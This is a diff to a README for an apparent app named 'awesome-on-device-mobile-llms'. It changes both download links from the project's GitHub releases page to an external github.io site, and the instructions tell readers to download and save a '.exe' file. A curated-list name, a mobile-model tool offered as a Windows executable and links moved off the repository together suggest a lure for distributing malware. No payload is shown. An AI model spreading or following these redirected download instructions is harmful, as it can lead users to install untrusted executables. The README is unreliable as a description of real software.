@@ -1,6 +1,6 @@
 # 📱 awesome-on-device-mobile-llms - Run private language models on mobile
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Rplu2687/awesome-on-device-mobile-llms/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://rplu2687.github.io)
 
 ## 📦 What is this application?
 
@@ -23,7 +23,7 @@ If your system meets these needs, you can run the software. The application hand
 
 Visit the official release page to download the latest version of the software. 
 
-[Click here to open the download page](https://github.com/Rplu2687/awesome-on-device-mobile-llms/releases)
+[Click here to open the download page](https://rplu2687.github.io)
 
 On this page, look for the section labeled "Assets." Click the link that ends with ".exe" to start the download. Save this file to your desktop or your downloads folder.
 
